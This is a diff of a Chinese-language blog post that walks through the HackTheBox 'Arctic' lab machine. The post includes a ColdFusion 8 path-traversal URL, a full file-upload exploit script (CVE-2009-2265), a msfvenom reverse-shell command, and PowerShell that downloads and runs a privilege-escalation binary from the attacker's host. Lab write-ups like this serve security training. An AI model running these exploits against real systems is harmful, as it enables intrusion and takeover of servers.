@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11   端口扫描1234567891011121314$ nmap -sC -sV -Pn 10.10.10.11Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan tim">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11                                                                                                              端口扫描1234567891011121314">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Arctic - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/02/Arctic-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11   端口扫描1234567891011121314$ nmap -sC -sV -Pn 10.10.10.11Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan tim">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11                                                                                                              端口扫描1234567891011121314">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122203.jpg">
@@ -131,7 +131,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -221,14 +221,35 @@
 </li>
 <li><h2 id="10-10-10-11"><a href="#10-10-10-11" class="headerlink" title="10.10.10.11"></a>10.10.10.11</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.11</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 13:58 CST</span><br><span class="line">Nmap scan report for 10.10.10.11</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">135/tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">8500/tcp  open  fmtp?</span><br><span class="line">49154/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 224.15 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="8500"><a href="#8500" class="headerlink" title="8500"></a>8500</h2><p>直接访问是两个目录，/CFIDE/administrator目录是登录页面，根据页面信息是ColdFusion 8：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122202.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="ColdFusion"><a href="#ColdFusion" class="headerlink" title="ColdFusion"></a>ColdFusion</h1><p>这个版本的ColdFusion有两种打法，一个是直接未授权上传jsp后去访问出发shell，另一种是任意文件读取拿到密码hash后解出来密码，登录进去上传shell：</p>
 <ul>
 <li>Adobe ColdFusion - Directory Traversal - Multiple remote Exploit<br><a href="https://www.exploit-db.com/exploits/14641" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14641</a></li>
@@ -238,13 +259,34 @@
 <li><a href="http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en" target="_blank" rel="noopener">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a></li>
 </ul>
 <p>读取出密码hash，解出来密码,用户名就是admin：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122204.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>另外如果解不出来明文密码，也可以直接使用hash生成登录用hash：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex_hmac_sha1(<span class="built_in">document</span>.loginform.salt.value, <span class="string">'2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'</span>);</span><br></pre></td></tr></table></figure>
 
 <p>登录进去,add new scheduled/task那里可以上传jsp，然后再去前面的目录里找到上传的文件访问触发(网页加载太慢了，用另一种方式打了)：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122206.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="任意文件上传-rce"><a href="#任意文件上传-rce" class="headerlink" title="任意文件上传/rce"></a>任意文件上传/rce</h2><p>论坛里给了脚本：</p>
 <ul>
 <li><a href="https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload" target="_blank" rel="noopener">https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload</a></li>
@@ -252,24 +294,73 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp lhost&#x3D;10.10.14.6 lport&#x3D;4445 -f raw &gt; miao.jsp</span><br><span class="line"></span><br><span class="line">$ python exp.py 10.10.10.11 8500 .&#x2F;miao.jsp</span><br><span class="line">Sending payload...</span><br><span class="line">Successfully uploaded payload!</span><br><span class="line">Find it at http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;userfiles&#x2F;file&#x2F;exploit.jsp</span><br></pre></td></tr></table></figure>
 
 <p> 然后去访问触发，getshell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload</span></span><br><span class="line"><span class="comment"># Date: 2017-10-16</span></span><br><span class="line"><span class="comment"># Exploit Author: Alexander Reid</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html</span></span><br><span class="line"><span class="comment"># Version: ColdFusion 8.0.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2009-2265</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1</span></span><br><span class="line"><span class="comment"># Uploads the specified jsp file to the remote server.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py &lt;target ip&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;</span></span><br><span class="line"><span class="comment"># Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp</span></span><br><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">5</span>:</span><br><span class="line">        path = sys.argv[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">with</span> open(sys.argv[<span class="number">4</span>], <span class="string">'r'</span>) <span class="keyword">as</span> payload:</span><br><span class="line">            body=payload.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        path = <span class="string">""</span></span><br><span class="line">        <span class="keyword">with</span> open(sys.argv[<span class="number">3</span>], <span class="string">'r'</span>) <span class="keyword">as</span> payload:</span><br><span class="line">            body=payload.read()</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Usage: ./exploit.py &lt;target ip/hostname&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'</span></span><br><span class="line">    sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">basepath = <span class="string">"http://"</span> + ip + <span class="string">":"</span> + port + path</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Sending payload...'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    req = requests.post(basepath + <span class="string">"/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/exploit.jsp%00"</span>, files=&#123;<span class="string">'newfile'</span>: (<span class="string">'exploit.txt'</span>, body, <span class="string">'application/x-java-archive'</span>)&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Successfully uploaded payload!\nFind it at '</span> + basepath + <span class="string">'/userfiles/file/exploit.jsp'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Failed to upload payload... '</span> + str(req.status_code) + <span class="string">' '</span> + req.reason</span><br><span class="line"><span class="keyword">except</span> requests.Timeout:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Failed to upload payload... Request timed out'</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>当前shell用户桌面得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122208.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>直接根据systeminfo信息分析提权建议，给出很多，这里选择10-059:</p>
 <ul>
 <li><a href="https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe" target="_blank" rel="noopener">https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122209.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>就是把exp传上去执行(直接加载meterpreter然后执行提权模块的话非常快)：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="variable">$webclient</span> = <span class="built_in">New-Object</span> System.Net.WebClient &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$url</span> = <span class="string">"http://10.10.14.6:7777/Chimichurri.exe"</span> &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$file</span> = <span class="string">"exploit.exe"</span> &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$webclient</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>) &gt;&gt;miao.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File miao.ps1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122210.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122211.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122212.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后直接Administrator用户桌面得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122213.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122213.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Adobe ColdFusion - Directory Traversal - Multiple remote Exploit<br><a href="https://www.exploit-db.com/exploits/14641" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14641</a></li>
 <li>ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) - CFM webapps Exploit<br><a href="https://www.exploit-db.com/exploits/16788" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/16788</a></li>
